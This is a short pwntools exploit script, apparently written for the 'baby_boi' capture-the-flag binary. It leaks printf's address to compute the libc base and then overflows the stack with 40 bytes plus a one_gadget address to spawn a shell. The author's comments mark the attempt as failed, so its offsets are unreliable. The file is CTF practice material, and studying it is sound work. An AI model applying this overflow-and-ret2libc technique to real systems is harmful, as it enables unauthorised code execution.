#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./baby_boi
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './baby_boi')
# libc = ELF('libc-2.27.so') # Inconsistency detected by ld.so
# thử với lib mới trong máy nhưng không có one_gadget nào chạy được luôn
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, env={"LD_PRELOAD":"/usr/lib/x86_64-linux-gnu/libc.so.6"}, *a, **kw)
    else:
        return process([exe.path] + argv, env={"LD_PRELOAD":"/usr/lib/x86_64-linux-gnu/libc.so.6"}, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x000000000040072e
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b"Here I am: ")
printf_addr = int(io.recvline().strip(), 16)
base = printf_addr - libc.symbols['printf']

one_gadget = 0x4c5d0 + base

payload = b"a"*40 + p64(one_gadget)
io.sendline(payload)

io.interactive()

# FAILED

